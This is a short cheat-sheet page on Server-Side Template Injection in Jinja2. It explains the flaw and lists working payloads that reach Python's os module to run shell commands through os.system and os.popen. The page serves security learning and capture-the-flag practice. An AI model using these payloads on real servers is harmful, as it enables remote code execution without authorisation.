# Server-Side Template Injection (SSTI)

[![jinja2_ssti](../../../../_badges/hacktricks/jinja2_ssti.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
[![python_ssti_introduction](../../../../_badges/rootme/web_server/python_ssti_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)

<div class="row row-cols-lg-2"><div>

Server-Side Template Injection occurs when we can inject code that is parsed by a template engine such as [Jinja2](/programming-languages/web/others/templating/jinja2/index.md) in Python.

You may be able to guess the template engine used from the web server, for instance, if it's Python then it's most likely Jinja.
</div><div>

**Example for Jinja2** ðŸ”¥ ([article](
https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/))

* Basic Test: `{{ "PoC"|e }}`
* Test if debug is enabled: `{% debug %}`
* Try to print the context `{{ self._TemplateReference__context }}`
* Then, you might be able to perform code injection:

```js!
{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler.__init__.__globals__.os.popen("ls -1a").read() }}
```

If the first payload return something, then try to use the shorter one.
</div></div>

<hr class="sep-both">

## ðŸ‘» To-do ðŸ‘»

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `{{ self.__init__.__globals__.__builtins__.__import__('os') }}`
</div><div>
</div></div>